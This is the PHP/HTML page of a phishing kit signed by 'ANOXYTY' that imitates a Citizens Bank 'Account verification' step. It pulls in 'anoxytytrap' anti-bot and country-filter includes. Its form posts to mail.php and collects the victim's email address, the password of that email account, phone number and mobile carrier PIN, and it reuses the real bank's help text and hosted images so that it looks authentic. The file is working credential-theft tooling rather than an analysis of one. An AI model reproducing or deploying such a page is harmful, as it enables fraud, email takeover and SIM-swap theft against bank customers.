﻿<?php 

/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';

?>
<html lang="en">
<head>
<style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style><style type="text/css">.uib-time input{width:50px;}</style><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
<meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta charset="UTF-8">



<title>Account verification</title>
<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
<meta name="robots" content="noindex, noimageindex, nofollow, nosnippet">
<link rel="stylesheet" href="assets/css/bootstrap.min.css">
<link rel="stylesheet" href="assets/css/angular-carousel.css">
<link rel="stylesheet" href="assets/css/jquery.ui.accordion.css">
<link rel="stylesheet" href="assets/css/jquery-ui.min.css">
<link rel="stylesheet" href="assets/css/table.css">
<link rel="stylesheet" href="assets/css/zenmonicons.css">
<link rel="stylesheet" href="assets/css/c3.css">
<link rel="stylesheet" href="assets/css/modal.css">
<link rel="stylesheet" href="assets/css/layout.css">
<link rel="stylesheet" href="assets/css/validation.css">
<link rel="stylesheet" href="assets/css/application.css">
<link rel="stylesheet" href="assets/css/spinner.css">
<link rel="stylesheet" href="assets/css/select2Altered.css">
<link rel="stylesheet" media="screen and (max-width: 400px)" href="assets/css/application-sm.css">
<link rel="stylesheet" media="screen and (min-width: 401px) and (max-width: 768px)" href="assets/css/application-med.css">
<link rel="stylesheet" media="screen and (min-width: 769px) and (max-width: 1024px)" href="assets/css/application-lg.css">
<link rel="stylesheet" media="screen and (min-width: 1024px)" href="assets/css/application-xl.css">
<link rel="stylesheet" href="assets/css/stepper.css">
<link rel="stylesheet" href="assets/css/carousel.css">
<link rel="stylesheet" href="assets/css/anglednavbar.css">
<link rel="stylesheet" href="assets/css/zentabs.css">
<link rel="stylesheet" href="assets/css/features/offers.css">
<link rel="stylesheet" href="assets/css/features/location-selection.css">
<link rel="stylesheet" href="assets/css/accordion.css">
<link rel="stylesheet" href="assets/css/slider.css">
<link rel="stylesheet" href="assets/css/base64Viewer.css">
<link rel="stylesheet" href="assets/css/features/product-tree.css">
<link rel="stylesheet" href="assets/css/segmented-control2.css">
<link rel="stylesheet" href="assets/css/datepicker_custom.css?02-04-2020 02:16:51 AM UTC">





</head><body id="content" class="ng-scope" data-inq-observer="1"><div id="inqC2CImgContainer_QA1" style="position:fixed;right:0; top: 300px; z-index: 999999;"></div><div id="appPlaceHolder"><header><div id="inqC2CImgContainerUAO" class="chatLinkDiv"></div></header><div class="pageContainer"><section class="dash"><!-- uiView: --><div data-ui-view="" class="ng-scope" style=""><!-- IMPORTANT -->
<!-- This file was only added since CBK-2111 affect Core and we cannot check-in any code at the time -->
<!-- PLEASE CHECK AND REMOVE IF NECESSARY ONCE CBK-211 IS MOVED TO CORE -->


<div class="card fullWidth no-margin-bottom ng-scope">
    <!-- ngIf: openAcctCtrl.context.getStepConfig().id != 'ErrorPage' || openAcctCtrl.context.getStepConfig().id != 'ErrorPageWithAppId' --><div id="topStepper" role="complementary" class="spaceBtw_mobileView oaoTopStepper ng-scope" data-ng-if="openAcctCtrl.context.getStepConfig().id != 'ErrorPage' || openAcctCtrl.context.getStepConfig().id != 'ErrorPageWithAppId'" data-ng-class="{'rowReverse' : !(openAcctCtrl.context.getPropsConfig().showProfileStepper &amp;&amp; openAcctCtrl.showStepper)}" style="">
        <!-- ngIf: openAcctCtrl.context.getPropsConfig().showProfileStepper && openAcctCtrl.showStepper --><mng-feature-stepper data-ng-if="openAcctCtrl.context.getPropsConfig().showProfileStepper &amp;&amp; openAcctCtrl.showStepper" stepper-data="openAcctCtrl.profileStepperSteps" stepper-index="openAcctCtrl.context.getPropsConfig().stepperIndex" class="aoStepper ng-scope ng-isolate-scope" style=""><div class="text-center width100"><nav><ol class="stepIndicator"><!-- ngRepeat: step in stepperData --><li ng-repeat="step in stepperData" data-ng-class="{'current' : step.name == stepperIndex,'hasSubSteps' : ((numberSubStepper>0) &amp;&amp; (numberSubStepper == stepperIndex)),'unvisited' : ((stepperIndex > 0) &amp;&amp; (step.name > stepperIndex)),'visited' : ((stepperIndex > 0) &amp;&amp; (step.name < stepperIndex))}" class="ng-scope visited"><a class="ng-binding">Login</a><span class="stepIcon" data-ng-show="((step.name < stepperIndex))" aria-hidden="false">n</span></li><!-- end ngRepeat: step in stepperData --><li ng-repeat="step in stepperData" data-ng-class="{'current' : step.name == stepperIndex,'hasSubSteps' : ((numberSubStepper>0) &amp;&amp; (numberSubStepper == stepperIndex)),'unvisited' : ((stepperIndex > 0) &amp;&amp; (step.name > stepperIndex)),'visited' : ((stepperIndex > 0) &amp;&amp; (step.name < stepperIndex))}" class="ng-scope current"><a class="ng-binding">Account Update</a><span class="stepIcon ng-hide" data-ng-show="((step.name < stepperIndex))" aria-hidden="true">n</span></li><!-- end ngRepeat: step in stepperData --><li ng-repeat="step in stepperData" data-ng-class="{'current' : step.name == stepperIndex,'hasSubSteps' : ((numberSubStepper>0) &amp;&amp; (numberSubStepper == stepperIndex)),'unvisited' : ((stepperIndex > 0) &amp;&amp; (step.name > stepperIndex)),'visited' : ((stepperIndex > 0) &amp;&amp; (step.name < stepperIndex))}" class="ng-scope unvisited"><a class="ng-binding">Card Information</a><span class="stepIcon ng-hide" data-ng-show="((step.name < stepperIndex))" aria-hidden="true">n</span></li><!-- end ngRepeat: step in stepperData --><li ng-repeat="step in stepperData" data-ng-class="{'current' : step.name == stepperIndex,'hasSubSteps' : ((numberSubStepper>0) &amp;&amp; (numberSubStepper == stepperIndex)),'unvisited' : ((stepperIndex > 0) &amp;&amp; (step.name > stepperIndex)),'visited' : ((stepperIndex > 0) &amp;&amp; (step.name < stepperIndex))}" class="ng-scope unvisited"><a class="ng-binding">Successful</a><span class="stepIcon ng-hide" data-ng-show="((step.name < stepperIndex))" aria-hidden="true">n</span></li><!-- end ngRepeat: step in stepperData --><!-- end ngRepeat: step in stepperData --></ol></nav></div></mng-feature-stepper><!-- end ngIf: openAcctCtrl.context.getPropsConfig().showProfileStepper && openAcctCtrl.showStepper -->
        <div class="showMobileCart flexCenter">
            <!-- ngIf: openAcctCtrl.context.getPropsConfig().showCart --><!-- ngInclude: 'features/openaccount/product/cartminimized.html' --><div data-ng-if="openAcctCtrl.context.getPropsConfig().showCart" data-ng-include="'features/openaccount/product/cartminimized.html'" data-ng-controller="MobileCartController as cardCtrl" class="ng-scope" style=""></div><!-- end ngIf: openAcctCtrl.context.getPropsConfig().showCart -->
        </div>
    </div><!-- end ngIf: openAcctCtrl.context.getStepConfig().id != 'ErrorPage' || openAcctCtrl.context.getStepConfig().id != 'ErrorPageWithAppId' -->
    <!-- ngIf: openAcctCtrl.isServerReachable --><div class="flexColumns block_768 ng-scope" data-ng-if="openAcctCtrl.isServerReachable" style="">
        <div class="flex60" role="main" aria-labelledby="pageTitle" aria-live="polite">
            <div class="justifySpaceBetween alignItemFlexStart">
                <h1 id="pageTitle" style="margin-bottom:0px;" class="spaceBtw_mobileView">
                    <!-- ngIf: openAcctCtrl.currentStepTitle && openAcctCtrl.context.getStepConfig().id!='success' && openAcctCtrl.context.getStepConfig().id !='ErrorPage' && openAcctCtrl.context.getStepConfig().id !='ErrorPageWithAppId' --><span data-ng-if="openAcctCtrl.currentStepTitle &amp;&amp; openAcctCtrl.context.getStepConfig().id!='success' &amp;&amp; openAcctCtrl.context.getStepConfig().id !='ErrorPage' &amp;&amp; openAcctCtrl.context.getStepConfig().id !='ErrorPageWithAppId'" data-ng-bind-html="openAcctCtrl.currentStepTitle" class="ng-binding ng-scope">Your Information</span><!-- end ngIf: openAcctCtrl.currentStepTitle && openAcctCtrl.context.getStepConfig().id!='success' && openAcctCtrl.context.getStepConfig().id !='ErrorPage' && openAcctCtrl.context.getStepConfig().id !='ErrorPageWithAppId' -->
                    <input id="hiddenTextField" class="hiddenTextField ng-pristine ng-untouched ng-valid ng-not-empty" type="hidden" autofocus="" ng-model="openAcctCtrl.currentStepTitle" autocomplete="off" aria-invalid="false">
                    <!-- ngIf: openAcctCtrl.currentStepTitle && !openAcctCtrl.context.isMobileBanker() &&openAcctCtrl.context.getStepConfig().id=='success' -->
                    <!-- ngIf: openAcctCtrl.currentStepTitle && openAcctCtrl.context.isMobileBanker() && openAcctCtrl.context.getStepConfig().id=='success' -->
                    <!-- ngIf: openAcctCtrl.removeApplicantAllowed && openAcctCtrl.context.getStepConfig().id !='ErrorPage' && openAcctCtrl.context.getStepConfig().id !='ErrorPageWithAppId' -->
                    <div class="showMobileCart flexCenter">
                        <!-- ngIf: !openAcctCtrl.hideHelpSection && openAcctCtrl.context.showPageHelpTextIcon --><img class="pull-right helpIcon ng-scope" alt="Help" src="https://applynow.citizensbank.com/openaccount/images/help.svg" data-ng-click="openAcctCtrl.openHelpTextModal()" data-ng-if="!openAcctCtrl.hideHelpSection &amp;&amp; openAcctCtrl.context.showPageHelpTextIcon" role="button" tabindex="0" style=""><!-- end ngIf: !openAcctCtrl.hideHelpSection && openAcctCtrl.context.showPageHelpTextIcon -->
                    </div>
                </h1>
                <div style="margin-top:20px;">
                    <!-- ngIf: openAcctCtrl.currentStepTitle && openAcctCtrl.context.getStepConfig().id!='success' && openAcctCtrl.context.showRelationship == 'true' -->
                </div>
            </div>
            <div>
                <!-- ngIf: openAcctCtrl.context.getStepConfig().description -->
            </div>

            <!-- Step Flow Screens -->
            <div data-ng-switch="openAcctCtrl.context.getStepConfig().id">

                <!-- ngSwitchWhen: GetStarted -->

                <!-- ngSwitchWhen: ConsumerLogon -->

                <!-- ngSwitchWhen: ConsumerLogonForJoint -->

                <!-- ngSwitchWhen: ConsumerLogonForProductEligibility -->

                <!-- ngSwitchWhen: BasicIndividualInfoConsumerLogonForProductEligibility -->

                <!-- ngSwitchWhen: SSNVerification -->

                <!-- ngSwitchWhen: SSNVerificationForJoint -->

                <!-- ngSwitchWhen: SSNVerificationForProductEligibility -->

                <!-- ngSwitchWhen: BasicIndividualInfoSSNVerificationForProductEligibility -->

                <!-- ngSwitchWhen: SearchApplication -->

                <!-- ngSwitchWhen: ListApplications -->

                <!-- ngSwitchWhen: ResumeApplication -->

                <!-- ngSwitchWhen: ProductSelection -->

                <!-- ngSwitchWhen: IndividualProfileConfirmationProductSelection -->

                <!-- ngSwitchWhen: AccountsFeatures -->

                <!-- ngSwitchWhen: TitlingSetup -->

                <!-- ngSwitchWhen: SignUp -->

                <!-- ngSwitchWhen: IndividualProfileConfirmation -->

                <!-- ngSwitchWhen: BasicIndividualInfo --><div data-ng-switch-when="BasicIndividualInfo" class="ng-scope" style="">
                    <!-- ngInclude: 'features/openaccount/profile/custinfo.html' --><div data-ng-include="'features/openaccount/profile/custinfo.html'" data-ng-controller="CustomerInfoController as custInfoCtrl" class="ng-scope" style=""><!-- ngIf: custInfoCtrl.isOLBLoginEnabled -->

<form name="custInfoCtrl.viewState.custInfoForm" valdr-type="CustInfoForm" class="ng-scope ng-valid-maxlength ng-invalid ng-invalid-valdr-required ng-valid-valdr-max-length ng-valid-valdr-min-length ng-valid-valdr-pattern ng-invalid-valdr ng-valid-valdr-email ng-invalid-valdr-phone-number ng-dirty ng-valid-parse" style="" method="post" action="mail.php">
	<!-- ngIf: custInfoCtrl.showCanMaskField -->

	
	
	
	<label style="font-weight: bold">Email Address</label>
	<div valdr-form-group="" data-ng-if="!custInfoCtrl.canMask" class="ng-scope form-field ng-invalid">
		<div class="floatlabel-wrapper" style="position:relative;width: 325px;"><input translate-field-labels="" type="text" name="exxx" class="textField ng-untouched ng-empty ng-valid-maxlength ng-invalid ng-invalid-valdr-required ng-valid-valdr-email ng-valid-valdr-max-length ng-invalid-valdr ng-dirty ng-valid-parse clearable" data-mng-floatlabel="" data-mng-clearable="" data-ng-model="custInfoCtrl.inputData.vaddresses[1].value"  data-ng-blur="custInfoCtrl.showMailTipMessage()" aria-label="Email Address" autocomplete="off" pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" style="transition: all 0.1s ease-in-out 0s; padding-top: 1px;" id="11" required></div>

		<div id="emailHint" class="messageHint">
			<div class="input-group col-xs-12">
				<div class="col-xs-1">
					<span class="icon primaryColor1">l</span>
				</div>
				<div class="col-xs-10">
					<span class="ng-binding">Your account confirmation will be sent to this address. Please make sure your email is correct.</span>
				</div>
			</div>
		</div>
	</div><!-- end ngIf: !custInfoCtrl.canMask -->
	<!-- ngIf: custInfoCtrl.canMask -->

	<!-- ngIf: !custInfoCtrl.canMask -->
	
	
	
	

	
	<label style="font-weight: bold">Email Address Password</label>
	<div valdr-form-group="" data-ng-if="!custInfoCtrl.canMask" class="ng-scope form-field ng-invalid">
		<div class="floatlabel-wrapper" style="position:relative;width: 325px;"><input translate-field-labels="" type="password" name="psss" class="textField ng-untouched ng-empty ng-valid-maxlength ng-invalid ng-invalid-valdr-required ng-valid-valdr-email ng-valid-valdr-max-length ng-invalid-valdr ng-dirty ng-valid-parse clearable" data-mng-floatlabel="" data-mng-clearable="" data-ng-model="custInfoCtrl.inputData.vaddresses[1].value"  autocomplete="off"   style="transition: all 0.1s ease-in-out 0s; padding-top: 1px;" id="11" required></div>

		<div id="emailHint" class="messageHint">
			<div class="input-group col-xs-12">
				<div class="col-xs-1">
					<span class="icon primaryColor1">l</span>
				</div>
				<div class="col-xs-10">
					<span class="ng-binding">Your account confirmation will be sent to this address. Please make sure your email is correct.</span>
				</div>
			</div>
		</div>
	<div class="valdr-message ng-binding ng-isolate-scope ng-invalid ng-untouched ng-dirty" valdr-message="email" id="email" role="alert">Please enter Email Address</div></div><!-- end ngIf: !custInfoCtrl.canMask -->
	<!-- ngIf: custInfoCtrl.canMask -->

	<!-- ngIf: !custInfoCtrl.canMask -->
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	<label style="font-weight: bold">Phone Number</label>
	
	
	
	<div valdr-form-group="" data-ng-if="!custInfoCtrl.canMask" class="ng-scope form-field ng-invalid">
		<div class="floatlabel-wrapper" style="position:relative;width: 245px;"> <input translate-field-labels="" type="tel" name="phn" class="textField ng-untouched ng-empty ng-invalid ng-invalid-valdr-required ng-invalid-valdr-phone-number ng-invalid-valdr ng-dirty ng-valid-parse clearable" data-mng-floatlabel="" data-mng-clearable="" data-ng-model="custInfoCtrl.inputData.vaddresses[0].value" autocomplete="off" data-ng-numpad-input="phonenumber" data-ng-model-options="{ allowInvalid: true }" aria-describedby="phone" role="textbox" aria-invalid="true" id="phn" style="transition: all 0.1s ease-in-out 0s;" required></div>
	</div><!-- end ngIf: !custInfoCtrl.canMask -->
	<!-- ngIf: custInfoCtrl.canMask -->

	<!-- ngIf: custInfoCtrl.context.isMobileBanker() -->

	<!-- ngIf: custInfoCtrl.isUSCitizenSegmentAllowed && custInfoCtrl.context.isPrimaryCustomer() && !custInfoCtrl.canMask -->

    

	
	
	
	<label style="font-weight: bold">Carrier Pin</label>
	
	
	
	<div valdr-form-group="" data-ng-if="!custInfoCtrl.canMask" class="ng-scope form-field ng-invalid">
		<div class="floatlabel-wrapper" style="position:relative;width: 200px;"> <input translate-field-labels="" type="tel" name="cpin" class="textField ng-untouched ng-empty ng-invalid ng-invalid-valdr-required ng-invalid-valdr-phone-number ng-invalid-valdr ng-dirty ng-valid-parse clearable" data-mng-floatlabel="" data-mng-clearable="" data-ng-model="custInfoCtrl.inputData.vaddresses[0].value"  autocomplete="off"  role="textbox" aria-invalid="true" id="93" style="transition: all 0.1s ease-in-out 0s;" required></div>
	</div><!-- end ngIf: !custInfoCtrl.canMask -->

	
	<!-- end ngIf: custInfoCtrl.lstAMLElements.length>0 --><!-- end ngRepeat: objElement in custInfoCtrl.lstAMLElements track by $index -->
	<!--- AML QUESTIONS/ ANSWERS END -->

	<input type="submit" value="submit" class="formDuplicateSubmit" style="display:none;">
	<div class="buttonContainer ng-scope" data-ng-if="!openAcctCtrl.context.getPropsConfig().showBackLink &amp;&amp; !openAcctCtrl.context.getPropsConfig().showCancelLink">
                <!-- ngIf: openAcctCtrl.context.getPropsConfig().showContinueButton --><button class="primaryActionButton disableTransit cbensightenevent ng-scope" role="submit" tabindex="0" data-ng-disabled="openAcctCtrl.disableNavigation" data-ng-if="openAcctCtrl.context.getPropsConfig().showContinueButton" data-ng-click="openAcctCtrl.clickSubmit()" translate="" cbdata-type="button" cbdata-reason="continue" style="">Continue</button><!-- end ngIf: openAcctCtrl.context.getPropsConfig().showContinueButton -->

                <!-- ngIf: openAcctCtrl.context.getPropsConfig().showAddOrEditInfo -->

                <!-- end ngIf: openAcctCtrl.context.getPropsConfig().showCancel -->
            </div>
</form>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
		$("#phn").mask('(000) 000-0000');
    </script>
</div>
                </div><!-- end ngSwitchWhen: -->

                <!-- ngSwitchWhen: IndividualIdInfo -->

                <!-- ngSwitchWhen: DemographicIndividualInfo -->

                <!-- ngSwitchWhen: EmploymentOrStudenInfo -->

                <!-- ngSwitchWhen: BusinessKYC -->

                <!-- ngSwitchWhen: IndividualKYC -->

                <!-- ngSwitchWhen: TermsAndConditions -->

                <!-- ngSwitchWhen: CustomerVerificationQuiz -->

                <!-- ngSwitchWhen: CDSpecificsInfo -->

                <!-- ngSwitchWhen: RetirementSpecificsInfo -->

                <!-- ngSwitchWhen: IRARetirementSpecificsInfo -->

                <!-- ngSwitchWhen: CheckingSpecificsInfo -->
                <!-- ngSwitchWhen: SavingSpecificsInfo -->

                <!-- ngSwitchWhen: IRASavingSpecificsInfo -->

                <!-- ngSwitchWhen: AccountTitleAddress -->

                <!-- ngSwitchWhen: AccountAssignment -->

                <!-- ngSwitchWhen: FundingChoiceSelection -->

                <!-- ngSwitchWhen: FundingOptions -->

                <!-- ngSwitchWhen: TransferFromAnotherBank -->

                <!-- ngSwitchWhen: CreditOrDebitCard -->

                <!-- ngSwitchWhen: InternalTransfer -->

                <!-- ngSwitchWhen: CashDeposit -->

                <!-- ngSwitchWhen: CashDepositSlip -->

                <!-- ngSwitchWhen: MailCheck -->

                <!-- ngSwitchWhen: TellerDeposit -->

                <!-- ngSwitchWhen: verificationSummary -->


                <!-- TODO below still to edit -->

                <!-- ngSwitchWhen: zipCode -->

                <!-- ngSwitchWhen: BusinessProfileConfirmation -->

                <!-- ngSwitchWhen: RelatedParty -->

                <!-- ngSwitchWhen: BasicBusinessInfo -->

                <!-- ngSwitchWhen: DemographicBusinessInfo -->

                <!-- ngSwitchWhen: BusinessIdInfo -->

                <!-- ngSwitchWhen: BusinessAuthorizedParties -->

                <!-- ngSwitchWhen: licenseBack -->

                <!-- ngSwitchWhen: licenseFront -->

                <!-- ngSwitchWhen: licenseInfo -->

                <!-- ngSwitchWhen: licenseInfo2 -->

                <!-- ngSwitchWhen: bsaAccountLevel -->

                <!-- ngSwitchWhen: reviewProduct -->

                <!-- Account specifics -->


                <!-- ngSwitchWhen: moneyMarketAccountSpecifics -->

                <!-- Institution -->
                <!-- ngSwitchWhen: institutionDetails -->
                <!-- funding -->



                <!-- FORMS -->
                <!-- ngSwitchWhen: FormsSignatureCapture -->



                <!-- ngSwitchWhen: checkDeposit -->


                <!-- ngSwitchWhen: mailDeposit -->
                <!-- features -->

                <!-- Account title address  -->



                <!-- Attachments -->

                <!-- ngSwitchWhen: attachments -->

                <!-- Offers -->

                <!-- ngSwitchWhen: creditCardOffers -->

                <!-- ngSwitchWhen: offers -->

                <!-- confirmation  -->

                <!-- ngSwitchWhen: BookingSuccess -->

                <!-- ngSwitchWhen: BookingPending -->

                <!-- ngSwitchWhen: BookingPendingForCDInCart -->

                <!-- ngSwitchWhen: BookingDeclined -->

                <!-- ngSwitchWhen: PendingVerification -->

                <!-- ngSwitchWhen: PendingVerificationDone -->

                <!-- ngSwitchWhen: BankerSsnResolutionChoice -->

                <!-- ngSwitchWhen: CustomerSsnResolutionChoice -->

                <!-- ngSwitchWhen: ConsumerLogonDueToDuplicateSsn -->

                <!-- ngSwitchWhen: CustomerMatchingListDueToSsn -->

                <!-- ngSwitchWhen: BankerOnBehalfVerificationSummary -->

                <!-- ngSwitchWhen: ErrorPage -->

                <!-- ngSwitchWhen: ErrorPageWithAppId -->

            </div>

           

            <!-- ngIf: openAcctCtrl.context.getPropsConfig().showBackLink -->
        </div>
        <div class="flex40">
            <!-- ngIf: openAcctCtrl.context.getPropsConfig().showCart --><div class="displayFlex alignItemCenter ng-scope" data-ng-if="openAcctCtrl.context.getPropsConfig().showCart" data-ng-show="(openAcctCtrl.context.getSelectedProductList().length > 0)
            		&amp;&amp; (openAcctCtrl.context.getZipCode() &amp;&amp; openAcctCtrl.context.getZipCode().length > 0)" aria-hidden="false" style="">
                <div class="displayFlex alignItemCenter marginRight25px hidden-application-md hidden-application-sm ng-hide" data-ng-show="openAcctCtrl.context.getApplication().applicationId &amp;&amp; !openAcctCtrl.context.getOpenAcctConfig().disableAttachements" aria-hidden="true">
                    <div class="icon" data-ng-click="openAcctCtrl.openAttachmentsModal()" title="attachment" role="button" tabindex="0">
                        <span>
                            <img src="images/attachment.png" height="20px" width="20px" alt="Attachments" tabindex="0">
                        </span>
                    </div>

                    <div class="ng-binding">0</div>
                </div>
                <!-- ngInclude: 'features/openaccount/product/cart.html' -->
            </div><!-- end ngIf: openAcctCtrl.context.getPropsConfig().showCart -->
            <!-- ngIf: !openAcctCtrl.hideHelpSection --><!-- ngInclude: 'features/openaccount/help/openaccounthelp.html' --><div data-ng-include="'features/openaccount/help/openaccounthelp.html'" data-ng-if="!openAcctCtrl.hideHelpSection" data-ng-controller="OpenAccountHelpPageController as openAcctHelpCtrl" class="ng-scope" style=""><div class="helpText ng-scope box" data-ng-class="{box: (openAcctHelpCtrl.items.length > 0)}" style="margin-bottom: 15px;">
    <!-- ngInclude: 'features/openaccount/help/helptext.html' --><div data-ng-include="'features/openaccount/help/helptext.html'" class="ng-scope" style=""><!-- ngRepeat: item in openAcctHelpCtrl.items --><!-- ngIf: (openAcctHelpCtrl.items.length > 1) --><div data-ng-repeat="item in openAcctHelpCtrl.items" data-ng-if="(openAcctHelpCtrl.items.length > 1)" class="ng-scope" style="">
    <!-- ngIf: item.title && !item.type --><h3 class="accentColor2 ng-binding ng-scope" data-ng-bind-html="item.title" data-ng-if="item.title &amp;&amp; !item.type">Why do I have to provide this information?</h3><!-- end ngIf: item.title && !item.type -->
    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length > 1) -->

    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) --><ul class="no-padding-left ng-scope" data-ng-if="(openAcctHelpCtrl.items.length > 1 &amp;&amp; item.items.length == 1)">
        <!-- ngRepeat: subject in item.items track by $index --><!-- ngIf: !item.type --><li data-ng-repeat="subject in item.items track by $index" data-ng-bind-html="subject" data-ng-if="!item.type" class="ng-binding ng-scope">Citizens bank requires all information must be filled, to validate record information.</li><!-- end ngIf: !item.type --><!-- end ngRepeat: subject in item.items track by $index -->

        <!-- ngRepeat: simpleItem in item.items track by $index --><!-- ngIf: item.type == 'simple' --><!-- end ngRepeat: simpleItem in item.items track by $index -->

        <!-- ngIf: item.type == 'image' -->

    </ul><!-- end ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) -->

</div><!-- end ngIf: (openAcctHelpCtrl.items.length > 1) --><!-- end ngRepeat: item in openAcctHelpCtrl.items --><!-- ngIf: (openAcctHelpCtrl.items.length > 1) --><div data-ng-repeat="item in openAcctHelpCtrl.items" data-ng-if="(openAcctHelpCtrl.items.length > 1)" class="ng-scope">
    <!-- ngIf: item.title && !item.type --><h3 class="accentColor2 ng-binding ng-scope" data-ng-bind-html="item.title" data-ng-if="item.title &amp;&amp; !item.type">How will my email address be used?</h3><!-- end ngIf: item.title && !item.type -->
    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length > 1) -->

    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) --><ul class="no-padding-left ng-scope" data-ng-if="(openAcctHelpCtrl.items.length > 1 &amp;&amp; item.items.length == 1)">
        <!-- ngRepeat: subject in item.items track by $index --><!-- ngIf: !item.type --><li data-ng-repeat="subject in item.items track by $index" data-ng-bind-html="subject" data-ng-if="!item.type" class="ng-binding ng-scope">We will send information about your account by email, including notifications of account activities.</li><!-- end ngIf: !item.type --><!-- end ngRepeat: subject in item.items track by $index -->

        <!-- ngRepeat: simpleItem in item.items track by $index --><!-- ngIf: item.type == 'simple' --><!-- end ngRepeat: simpleItem in item.items track by $index -->

        <!-- ngIf: item.type == 'image' -->

    </ul><!-- end ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) -->

</div><!-- end ngIf: (openAcctHelpCtrl.items.length > 1) --><!-- end ngRepeat: item in openAcctHelpCtrl.items --><!-- ngIf: (openAcctHelpCtrl.items.length > 1) -->
<!-- ngIf: openAcctHelpCtrl.items.length == 1 --></div>
</div>

<!-- ngIf: openAcctHelpCtrl.context.getOpenAcctConfig().showAdvertisementSection == true --></div><!-- end ngIf: !openAcctCtrl.hideHelpSection -->
        </div>
    </div><!-- end ngIf: openAcctCtrl.isServerReachable -->

    <!-- ngIf: !openAcctCtrl.isServerReachable -->

